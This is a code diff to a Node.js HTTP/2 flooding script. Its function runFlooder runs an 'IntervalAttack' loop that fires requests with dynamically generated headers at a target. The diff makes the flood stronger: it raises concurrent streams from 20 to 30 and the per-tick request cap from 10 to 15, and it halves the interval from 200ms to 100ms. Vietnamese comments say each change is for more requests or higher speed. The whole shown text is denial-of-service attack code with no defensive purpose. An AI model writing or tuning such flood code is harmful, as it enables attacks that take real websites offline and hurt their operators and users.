@@ -245,7 +245,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 20,
+                maxConcurrentStreams: 30, // Tăng lên 30 để xử lý nhiều request hơn
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536
             },
@@ -255,7 +255,7 @@ function runFlooder() {
         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 const dynHeaders = generateDynamicHeaders();
-                for (let i = 0; i < Math.min(args.Rate, 10); i++) {
+                for (let i = 0; i < Math.min(args.Rate, 15); i++) { // Tăng giới hạn lên 15
                     const request = client.request(dynHeaders);
                     request.on("response", () => {
                         request.close();
@@ -267,7 +267,7 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, 200);
+            }, 100); // Giảm xuống 100ms để tăng tốc độ
             setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
         });
 
